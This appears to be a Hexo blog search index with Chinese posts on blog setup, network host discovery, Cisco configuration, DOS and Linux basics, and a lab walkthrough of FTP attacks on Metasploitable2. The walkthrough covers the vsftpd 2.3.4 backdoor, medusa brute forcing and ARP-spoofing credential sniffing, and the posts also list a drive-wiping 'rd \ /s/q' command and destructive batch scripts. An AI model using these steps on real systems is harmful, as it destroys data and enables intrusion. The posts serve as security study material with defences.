<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hexo调试-2</title>
    <url>/2020/06/06/2020-6-6-2/</url>
    <content><![CDATA[<p>现在可以插入图片了！！<img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/c.gif" alt></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1.gif" alt></p>
]]></content>
      <categories>
        <category>调试</category>
      </categories>
      <tags>
        <tag>日常</tag>
        <tag>调试</tag>
      </tags>
  </entry>
  <entry>
    <title>四层主机发现</title>
    <url>/2020/06/25/2020-6-25/</url>
    <content><![CDATA[<blockquote>
<p>这里稍稍总结一下局域网内的主机发现方法</p>
<p>渗透机：Kali Linux 2019.3版</p>
</blockquote>
<h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><blockquote>
<p>ISO七层模型，是国际标准化组织（ISO）制定的一个用于计算机或通信系统间互联的标准体系，一般称为OSI参考模型或七层模型。</p>
</blockquote>
<h2 id="二层主机发现"><a href="#二层主机发现" class="headerlink" title="二层主机发现"></a>二层主机发现</h2><p>利用 了ISO中链路层中的协议进行主机发现，一般使用<strong>ARP协议</strong></p>
<p>由于是利用MAC地址作为对应的识别地址</p>
<p><strong>优点</strong></p>
<ol>
<li>速度快</li>
<li>可靠性高</li>
</ol>
<p><strong>缺点</strong></p>
<ol>
<li>无法扫描经过路由的主机</li>
</ol>
<h4 id="二层发现-arping工具"><a href="#二层发现-arping工具" class="headerlink" title="二层发现-arping工具"></a><strong>二层发现-arping工具</strong></h4><p>Kali下自带的arping工具可以进行对应的二层主机发现</p>
<p><strong>缺点：无法多个主机同时扫描</strong></p>
<blockquote>
<p>arping 目标ip</p>
<p>这里的 -c 参数可指定发送的ping包数量</p>
<p>若不指定会持续ping 需人工暂停</p>
<p>arping -help 可查看帮助文档</p>
</blockquote>
<p><strong><em>几乎所有工具都能使用help参数查看帮助文档，后续不再赘述</em></strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-71.png" alt></p>
<h4 id="二层发现-netdiscover工具"><a href="#二层发现-netdiscover工具" class="headerlink" title="二层发现-netdiscover工具"></a>二层发现-netdiscover工具</h4><p>netdiscover工具可以针对特定子网进行<strong>多主机</strong>扫描</p>
<blockquote>
<p>netdiscover -r 192.168.1.1/24</p>
<p>扫描192.168.1.0网段</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-72.png" alt></p>
<h2 id="三层主机发现"><a href="#三层主机发现" class="headerlink" title="三层主机发现"></a>三层主机发现</h2><p>利用了ISO中网络中的协议进行主机发现，一般使用<strong>ICMP协议</strong></p>
<p><strong>优点</strong></p>
<ol>
<li>可以发现远程主机，经过路由的主机</li>
<li>速度相对比较快</li>
</ol>
<p><strong>缺点</strong></p>
<ol>
<li>数据包经常被防火墙过滤</li>
<li>速度比二层发现要慢</li>
</ol>
<h4 id="三层发现-ping工具"><a href="#三层发现-ping工具" class="headerlink" title="三层发现-ping工具"></a>三层发现-ping工具</h4><blockquote>
<p>ping 目标ip</p>
<p>ping工具在Linux和Windows都有自带</p>
<p>Linux下如果不使用-C参数，将会一直扫描</p>
<p>windows默认四次探测</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-73.png" alt></p>
<h4 id="三层发现-fping工具"><a href="#三层发现-fping工具" class="headerlink" title="三层发现-fping工具"></a>三层发现-fping工具</h4><p>fping可针对多个主机同时进行扫描</p>
<blockquote>
<p>fping -g 192.168.1.1/24</p>
<p>扫描192.168.1.0网段</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-74.png" alt></p>
<h4 id="三层发现-hping3工具"><a href="#三层发现-hping3工具" class="headerlink" title="三层发现-hping3工具"></a>三层发现-hping3工具</h4><p><strong><em>特点：可发送自定义ICMP数据包来绕过防火墙</em></strong></p>
<blockquote>
<p>示例：</p>
<p>hping3 -c 3 -1 192.168.0.103 –icmpcode 1</p>
<p>自定义ICMP包可在help中查看帮助文档</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-75.png" alt></p>
<h2 id="四层主机发现"><a href="#四层主机发现" class="headerlink" title="四层主机发现"></a>四层主机发现</h2><p>利用了ISO中的传输层协议进行主机发现，<strong>一般使用TCP、UDP探测</strong></p>
<p><strong>优点</strong></p>
<ol>
<li>可以探测远程主机</li>
<li>比三层发现更靠谱</li>
</ol>
<p><strong>缺点</strong></p>
<ol>
<li>花费时间较长</li>
</ol>
<h4 id="四层发现-nmap工具"><a href="#四层发现-nmap工具" class="headerlink" title="四层发现-nmap工具"></a>四层发现-nmap工具</h4><blockquote>
<p>nmap可以进行二、三、四层的探测</p>
</blockquote>
<blockquote>
<p>nmap 目标IP</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-76.png" alt></p>
<h4 id="四层发现-hping3工具"><a href="#四层发现-hping3工具" class="headerlink" title="四层发现-hping3工具"></a>四层发现-hping3工具</h4><blockquote>
<p>hping3 –udp -c 3 192.168.0.103</p>
<p>这里原理如同hping3，指定UDP探测</p>
<p>（这里需要结合多层探测，不再赘述）</p>
</blockquote>
<h2 id="主机发现-Python脚本"><a href="#主机发现-Python脚本" class="headerlink" title="主机发现-Python脚本"></a>主机发现-Python脚本</h2><p>可在github上寻找相关资源</p>
<p>由于各类脚本繁杂，这里不作推荐</p>
]]></content>
      <categories>
        <category>网络空间安全</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>收录</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo调试-1</title>
    <url>/2020/06/06/2020-6-6/</url>
    <content><![CDATA[<p>Hexo基本搭建完成</p>
]]></content>
      <categories>
        <category>调试</category>
      </categories>
      <tags>
        <tag>日常</tag>
        <tag>调试</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo调试-4</title>
    <url>/2020/06/07/2020-6-7-2/</url>
    <content><![CDATA[<p>花了将近一下午的时间，换了另外一款主题，优化了一下界面<br>现在的界面没之前那么单调了，看起来挺舒服的，纵享丝滑<br>这个主题还有预加载功能，体验极好<br>得找点图来，自带的这些图不怎么不好看</p>
]]></content>
      <categories>
        <category>调试</category>
      </categories>
      <tags>
        <tag>日常</tag>
        <tag>调试</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo调试-5</title>
    <url>/2020/06/07/2020-6-7-3/</url>
    <content><![CDATA[<p>又花了几个小时，尝试了一下coding + github 双部署，又觉得coding的使用效果强差人意，还是罢了<br>还有一部分时间，调试了下右下角的这个玩意儿，选来选去，还是用现在这个好了<br>左下角还有个播放音乐的功能，我觉得还挺不错</p>
]]></content>
      <categories>
        <category>调试</category>
      </categories>
      <tags>
        <tag>日常</tag>
        <tag>调试</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo调试-3</title>
    <url>/2020/06/07/2020-6-7/</url>
    <content><![CDATA[<p>换了个NexT主题<br>挑了一个比较满意的主题风格<br>忙活了几个小时<br>已经1点了<br>是时候休息了呀</p>
]]></content>
      <categories>
        <category>调试</category>
      </categories>
      <tags>
        <tag>日常</tag>
        <tag>调试</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo调试-7</title>
    <url>/2020/06/08/2020-6-8-2/</url>
    <content><![CDATA[<p>找来了一些图，放在了那个自己搭的图床里，以后再用</p>
<p>测试了一下博客的访问速度，发现访问速度还是不尽人意，看来GitHub+jsDelivr搭建的图库还是有些小卡，明天再找点教程优化一下吧，弄好之后，就可以一篇一篇的水了233</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/KKEA$V0X8F6WZJE80%7BWN_L8.jpg" alt></p>
]]></content>
      <categories>
        <category>调试</category>
      </categories>
      <tags>
        <tag>日常</tag>
        <tag>调试</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo调试-6</title>
    <url>/2020/06/08/2020-6-8/</url>
    <content><![CDATA[<p>用了昨天一个晚上晚上，和今天上午几个小时，用GitHub+jsDelivr+PicGo搭建了个免费图床，感觉效果还不错，还弄了个Gitalk 评论模块，挺好看的，有个美中不足的地方，就是要Github登录之后才能评论，不过也好，还世界一片清净。</p>
<p>对博客的访问速度优化了一下，在预加载的基础上，弄了个懒加载，<code>懒加载</code>就是:一般是当图片滚动进可视窗口内才加载图片，可视窗口之外的图片则不加载,既保证了网页的打开速度，也不会因图片的庞大体积而拖累了整个页面的加载。</p>
<p>接下来，找点好看的图，把那些细节优化一下，弄完之后，Hexo差不多就调试完毕了</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/0.jpg" alt></p>
]]></content>
      <categories>
        <category>调试</category>
      </categories>
      <tags>
        <tag>日常</tag>
        <tag>调试</tag>
      </tags>
  </entry>
  <entry>
    <title>端口聚合</title>
    <url>/2020/07/15/2020-7-15/</url>
    <content><![CDATA[<h1 id="网络搭建—端口聚合"><a href="#网络搭建—端口聚合" class="headerlink" title="网络搭建—端口聚合"></a>网络搭建—端口聚合</h1><blockquote>
<p>实验平台: Cisco Packet Tracer 7.3.0</p>
</blockquote>
<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200715182930.png" alt></p>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>SW-1</p>
<pre><code>en
config
int range f0/2-3
sw mode trunk
channel-group 1 mode on
exit
port-channel load-balance dst-ip</code></pre><p>SW-2</p>
<pre><code>en
config
int range f0/2-3
sw mode trunk
channel-group 1 mode on
exit
port-channel load-balance dst-ip</code></pre><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200715182919.png" alt></p>
]]></content>
      <categories>
        <category>网络搭建</category>
      </categories>
      <tags>
        <tag>收录</tag>
        <tag>网络搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>CHAP认证</title>
    <url>/2020/07/15/CHAP/</url>
    <content><![CDATA[<h1 id="网络搭建—CHAP认证"><a href="#网络搭建—CHAP认证" class="headerlink" title="网络搭建—CHAP认证"></a>网络搭建—CHAP认证</h1><h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200715211109.png" alt></p>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>R1</p>
<pre><code>en
config
username B PAssword 123
int s0/0/0
ip add 192.168.1.1 255.255.255.0
no shutdown
encapsulation ppp
ppp authentication chap
ppp chap hostname A
ppp chap password 123
exit
aaa new-model 
aaa authentication ppp default local</code></pre><p>R2</p>
<pre><code>en
config
username A PAssword 123
int s0/0/0
ip add 192.168.1.2 255.255.255.0
no shutdown
encapsulation ppp
ppp authentication chap
ppp chap hostname B
ppp chap password 123
exit
aaa new-model 
aaa authentication ppp default local</code></pre>]]></content>
      <categories>
        <category>网络搭建</category>
      </categories>
      <tags>
        <tag>收录</tag>
        <tag>网络搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>批处理编写</title>
    <url>/2020/06/27/DOS-1/</url>
    <content><![CDATA[<h1 id="一些基础批处理编写收录"><a href="#一些基础批处理编写收录" class="headerlink" title="一些基础批处理编写收录"></a>一些基础批处理编写收录</h1><ol>
<li><p><strong>批处理的作用</strong></p>
<p>自上而下成批的处理每一条命令，直到执行最后一条</p>
</li>
<li><p><strong>创建批处理</strong></p>
<p>批处理文件的扩展名：<strong>.bat</strong></p>
</li>
<li><p><strong>基础命令</strong></p>
<p>@echo off   关闭执行过程</p>
<p>pause   程序暂停</p>
<p>title   黑框标题</p>
<p>echo.   输出空行（仅在批处理中有用）</p>
<p>ping -n 10 127.0.0.1 &gt;nul   延迟10个ping包后关闭程序</p>
<p>%变量%   取值</p>
<p>shutdown    关机</p>
<p>ntsd   杀死进程</p>
<p>taskkill   杀死进程</p>
<p>fsutil file createnew 文件路径 大小   新建文件</p>
<blockquote>
<p>例：fsutil file createnew e:\123.txt 40960    //在e:\下建立一个叫123.txt的文件，大小为40kb</p>
</blockquote>
<p><strong>:   定义区块(这是冒号)</strong></p>
<p>可以理解为C语言的{}，可以和<strong>goto（跳转）</strong>配合使用，例：</p>
<blockquote>
<p>:1   //区块1</p>
<p>命令1</p>
<p>命令2</p>
<p>:2   //区块2</p>
<p>命令1</p>
<p>:3   //区块3</p>
<p>goto :1   //跳转到区块1</p>
</blockquote>
<p><strong>set   定义变量</strong></p>
<blockquote>
<p>例：</p>
<p>set /p a=请输入a的值    </p>
<p> /p参数定义输入函数，若没有/p  =右边的文本会变成a的值</p>
</blockquote>
</li>
<li><h5 id="一些批处理实例-命令后的-是注释的意思，实际使用请划去"><a href="#一些批处理实例-命令后的-是注释的意思，实际使用请划去" class="headerlink" title="一些批处理实例   命令后的//是注释的意思，实际使用请划去//"></a>一些批处理实例   <strong>命令后的//是注释的意思，实际使用请划去</strong>//</h5><blockquote>
<p>如果看不懂请配合《DOS基本命令》查看</p>
</blockquote>
</li>
</ol>
<h5 id="C盘毁灭机"><a href="#C盘毁灭机" class="headerlink" title="C盘毁灭机"></a>C盘毁灭机</h5><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202107.png" alt></p>
<p><strong>撑死他的硬盘</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202141.png" alt></p>
<p><strong>死循环爆CPU</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202224.png" alt></p>
<p><strong>关机小程序(这可能是唯一一个有益的程序)</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202303.png" alt></p>
<p><strong>蓝屏战士</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202322.png" alt></p>
<p><strong>恐吓小脚本</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/20200627202553.png" alt></p>
]]></content>
      <categories>
        <category>网络空间安全</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>收录</tag>
      </tags>
  </entry>
  <entry>
    <title>DOS基本命令</title>
    <url>/2020/06/26/DOS/</url>
    <content><![CDATA[<h1 id="DOS基本命令"><a href="#DOS基本命令" class="headerlink" title="DOS基本命令"></a>DOS基本命令</h1><h2 id="一、DOS命令"><a href="#一、DOS命令" class="headerlink" title="一、DOS命令"></a>一、DOS命令</h2><ol>
<li><p>color help   改变背景及字体颜色</p>
</li>
<li><p>cls   清屏</p>
</li>
<li><p>dir   查看当前文件夹下的文件</p>
<p>文件类型中有 (DIR) 表示的是“文件夹”，否则代表“文件”</p>
<p>dir /a 显示所有文件</p>
</li>
<li><p>cd   进入指定目录</p>
<p>cd .. 返回上一级目录</p>
<p>cd \ 退至根目录   (\代表根)</p>
<p>cd .. \xaa 退出至上级目录后进入\xaa</p>
<p>cd \a\xaa 进入xaa（绝对路径）</p>
<p>切换到其他硬盘：直接输入盘符</p>
<p>例如：E：    C：</p>
</li>
<li><p>md    创建文件夹/目录</p>
<p>md 1 2 3 4 5 用空格分隔创建多个文件夹</p>
<p>md “1 2 3 4 5 “ 引号标记其为文本格式</p>
<p>md a\b\c\d   递归创建(套娃)</p>
</li>
<li><p>rd   删除<strong>文件夹/目录</strong></p>
<p>rd 1 2 3 4 5 用空格分隔删除多个文件夹</p>
<p>rd “1 2 3 4 5 “ 引号标记其为文本格式</p>
<p>rd 目录 /s /q  （/s参数代表删除文件夹下所有的文件,/q代表跳过删除警告强行删除）</p>
<p>rd \ /s/q    格盘</p>
</li>
<li><p>del   删除<strong>文件</strong></p>
</li>
<li><p>‘  &gt;  漏斗</p>
<p>dir &gt; 1.txt   将dir命令输出结果<strong>覆盖式</strong>保存至1.txt</p>
<p>dir &gt;&gt; 1.txt   将dir命令输出结果<strong>追加式</strong>保存至1.txt</p>
<p>echo Oscurnb!  &gt;  1.txt 将echo回显文本保存至1.txt</p>
<p>默认情况下&gt;和&gt;&gt;只导出<strong>正确回显</strong>，需在&gt;前添加’2’</p>
<p>1&gt; 输出<strong>正确回显</strong>   2&gt;输出<strong>错误回显</strong>   （<strong>&gt;默认为1&gt;</strong>）</p>
<p>rd . /s/q 2&gt;<strong>nul</strong> &gt;nul   丢弃输出数据，命令行不保留回显</p>
</li>
<li><p>type   打印</p>
<p>type 1.txt   浏览文件内容</p>
</li>
<li><p>copy   复制</p>
<p>move   剪切/移动</p>
<p>ren   重命名</p>
</li>
<li><p>attrib   修改目录\文件属性</p>
<p>attrib +h 1.txt    将1.txt属性添加“隐藏属性”</p>
<p>attrib -h 1.txt    将1.txt属性取消“隐藏属性”</p>
<p>+s    添加成”系统级文件夹”</p>
</li>
</ol>
]]></content>
      <categories>
        <category>网络空间安全</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>收录</tag>
      </tags>
  </entry>
  <entry>
    <title>FTP服务漏洞利用</title>
    <url>/2020/06/25/FTP-Vulnerability/</url>
    <content><![CDATA[<h1 id="关于FTP服务的常见漏洞"><a href="#关于FTP服务的常见漏洞" class="headerlink" title="关于FTP服务的常见漏洞"></a>关于FTP服务的常见漏洞</h1><h2 id="1-FTP匿名登录微笑漏洞"><a href="#1-FTP匿名登录微笑漏洞" class="headerlink" title="1.FTP匿名登录微笑漏洞"></a>1.FTP匿名登录微笑漏洞</h2><p>靶机metasploitable2-Linux VSFTPD v2.3.4版本</p>
<p>渗透机 Kali Linux 2019.3版本</p>
<p><strong>触发条件：服务允许匿名登录</strong></p>
<ol>
<li><strong>首先使用扫描工具对21端口（ftp默认开放于21端口）进行扫描，检测其开放性。</strong></li>
</ol>
<p>这里使用<strong>nmap工具</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-51.png" alt></p>
<p>该端口处于open（开放）状态</p>
<p>小提示：如果使用扫描工具扫描6200端口（即漏洞触发端口）会显示端口关闭</p>
<p>虽然是关闭状态，但是不会影响漏洞触发，所以不必担心</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-63.png" alt></p>
<ol start="2">
<li><strong>使用nc命令连接FTP服务器</strong></li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-53.png" alt></p>
<p>在空命令行里输入：</p>
<p><strong>user anonymous</strong>（使用匿名账户进行登录）<strong>若回显参数为331</strong>，则输入成功</p>
<p>然后接着输入</p>
<p><strong>pass pass</strong>（输入密码)由于是匿名登录，pass可以随便打，<strong>若回显参数为230</strong>，则输入成功</p>
<p>接着可以使用<strong>help命令测试</strong>，登录成功！</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-54.png" alt></p>
<p>测试完毕匿名登录的可用性之后，开始利用漏洞</p>
<ol start="3">
<li><p><strong>触发微笑漏洞</strong></p>
<p>使用nc命令连接目标21端口</p>
<p>命令行输入：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-55.png" alt></p>
<p>这里的user用户名可以随便输入，<strong>但是必须包含   :)    字符</strong></p>
<p>密码也能随便输入，这一步是触发位于6200端口的漏洞</p>
<p>这里输入help的话是不会回显参数的，这一步登录仅触发漏洞，并无登录意图</p>
<p><strong>（因包含的字符是 :) 横着看像一个笑脸，所以被誉为FTP笑脸漏洞）</strong></p>
<ol start="4">
<li><p><strong>连接端口，漏洞利用</strong></p>
<p>使用nc连接6200漏洞端口</p>
<p>输入id命令，可以看到已经获取的root权限了</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-56.png" alt></p>
<h3 id="防御方法！"><a href="#防御方法！" class="headerlink" title="防御方法！"></a>防御方法！</h3><blockquote>
<ol>
<li>FTP服务禁止匿名登录</li>
<li>可打上相关的漏洞补丁</li>
<li>设置防火墙禁止后门6200端口</li>
</ol>
</blockquote>
</li>
</ol>
</li>
</ol>
<h2 id="2-FTP暴力破解"><a href="#2-FTP暴力破解" class="headerlink" title="2.FTP暴力破解"></a>2.FTP暴力破解</h2><p><strong>Kali内集成有很多密码破解工具，这里用medusa举例</strong></p>
<p>medusa -h 目标IP -u 用户名 -P 字典 -M FTP</p>
<p>参数-U大写U意为指定用户名字典，小写u指定用户名，-p参数同理，-M指定服务</p>
<p>可自行编写密码字典，也可以用命令生成（详见其他文章）</p>
<p>每个密码之间换行就行，这里编写了mm.txt字典</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-57.png" alt></p>
<p>开始破解，注意这里的字典文件必须使用<strong>绝对路径</strong></p>
<p>注意，暴力破解的速度取决于<strong>服务器响应速度</strong>和<strong>攻击机处理速度</strong></p>
<p>所以可以在medusa使用 <strong>-t 和 -r 参数</strong>设置<strong>线程数量</strong>和<strong>重试间隔时间</strong>（默认为3秒）</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-58.png" alt></p>
<p>破解成功！密码为msfadmin，返回了【SUCCESS】（成功！）</p>
<h3 id="防御方法！-1"><a href="#防御方法！-1" class="headerlink" title="防御方法！"></a>防御方法！</h3><blockquote>
<p>这里以Windows Server 2008 R2为例</p>
<p>开始 - 管理工具 - 本地安全策略 - 安全设置 - 账户策略 - 账户锁定策略 - 账户锁定阀值</p>
<p>可设置（___）次无效登录后锁定账户，点击确定后还可设置锁定时间</p>
</blockquote>
<h2 id="3-FTP明文验证抓包"><a href="#3-FTP明文验证抓包" class="headerlink" title="3.FTP明文验证抓包"></a>3.FTP明文验证抓包</h2><p>由于<strong>FTP是明文验证/传输</strong>的，所以避免不了网络抓包获取密码</p>
<p>可以使用<strong>ARP欺骗</strong>（又称断网攻击）进行攻击，网络崩溃后使用<strong>抓包工具</strong>持续抓包</p>
<p><strong>这里用Wireshark示例</strong></p>
<ol>
<li><strong>进行ARP欺骗攻击</strong></li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-59.png" alt></p>
<blockquote>
<p>arpspoof -i eth0 -t 192.168.0.103 192.168.0.255</p>
<p>这里的eth0是本地网卡，注意这里是数字0而不是字母O</p>
<p>后面第一个IP是目标IP  第二个是本地网关</p>
</blockquote>
<p><strong>开始持续ARP攻击，此时目标网络连接会崩溃，一段时间后关闭ARP欺骗，开启抓包监听</strong></p>
<p>筛选到涉及相关IP的数据流，找到可疑的数据包</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-60.png" alt></p>
<p>这里可以直观的看到抓取了明文数据流，劫获了目标的登录名和密码</p>
<p>当然也可以<strong>右键 - 追踪流 - TCP流</strong>更直观的看到</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-61.png" alt></p>
<h3 id="防御方法！-2"><a href="#防御方法！-2" class="headerlink" title="防御方法！"></a>防御方法！</h3><blockquote>
<p>使用SFTP等其他密文加密传输服务来代替FTP</p>
</blockquote>
<h2 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h2><p>这里用setoolkit更适用，sessions可直观查看存在的后门并进行连接</p>
<p>关于上传木马文件并诱其运行以及防御措施等方法不再赘述</p>
]]></content>
      <categories>
        <category>网络空间安全</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>收录</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux中关于文件权限</title>
    <url>/2020/06/25/Linux-1/</url>
    <content><![CDATA[<blockquote>
<p> 这里归类一下Linux下的文件权限类型</p>
<p>方便新手查看</p>
</blockquote>
<p>首先，在查看目录下输入</p>
<blockquote>
<p>ls -alh</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-81.png" alt></p>
<p>这里拿a.out文件举例</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-82.png" alt></p>
<blockquote>
<p>这里分别对应的是：<strong>文件权限   文件数量  用户  文件大小  创建日期  文件名</strong> </p>
<p>a.out中，1代表文件数量为1个，创建\权限用户为root用户，大小为17kb</p>
<p>创建日期为6月25日14:13  文件名为a.out</p>
</blockquote>
<p>而开头的代码表意为<strong>文件权限</strong>  我们把它分为<strong>四等份</strong>查看</p>
<hr>
<pre><code>-rwxr-xr-x
-   rwx   r-x   r-x</code></pre><hr>
<p>这四等份从左至右代表的一样分别是：</p>
<p><strong>文件类型    当前用户权限   所属组用户权限   其他用户权限</strong></p>
<p>文件类型：</p>
<p>l（快捷方式）d（目录）c（设备）b（块设备） - (其他类型）</p>
<blockquote>
<p> 图中的（..）和（.）的文件类型都是d（即目录）</p>
</blockquote>
<p><strong>关于用户权限</strong></p>
<hr>
<p>r：读取权限</p>
<p>w：写入权限</p>
<p>x：执行权限</p>
<hr>
<p>注意：<strong>文件权限的排版是按rwx规定格式排版</strong></p>
<p>所以不会出现rxw xwr之类的情况</p>
<p>例如这里</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-82.png" alt></p>
<p>文件a.out当前用户具有<strong>rwx</strong>权限（即读、写、执行权限）</p>
<p><strong>所属用户组</strong>却只有<strong>r-x</strong>权限（即读、执行权限）</p>
<p>由于<strong>w权限</strong>所在的位置是 <strong>（ - ）</strong> 所以所属用户组没有<strong>写入权限</strong> </p>
<blockquote>
<p>Kali中拥有执行权限的文件名会变成绿色</p>
<p>但颜色并不一定代表文件权限，请勿混淆</p>
</blockquote>
<p>这里的a.out拥有x权限，所以可以尝试运行</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-83.png" alt></p>
<p><strong>这个时候有人会问了，如果写的程序没有执行权限该怎么办？</strong></p>
<h2 id><a href="#" class="headerlink" title></a><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-84.png" alt></h2><pre><code>chmod +x 1.py   为1.py文件添加x权限（执行权限）
chmod -x 1.py   为1.py文件去除x权限（执行权限）</code></pre><hr>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-85.png" alt></p>
<p>这里就成功运行了！</p>
<p>再使用ls查看，会发现1.py多出了x权限</p>
<p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/1-86.png" alt></p>
]]></content>
      <categories>
        <category>网络空间安全</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux文件基础命令</title>
    <url>/2020/09/14/Linux-2/</url>
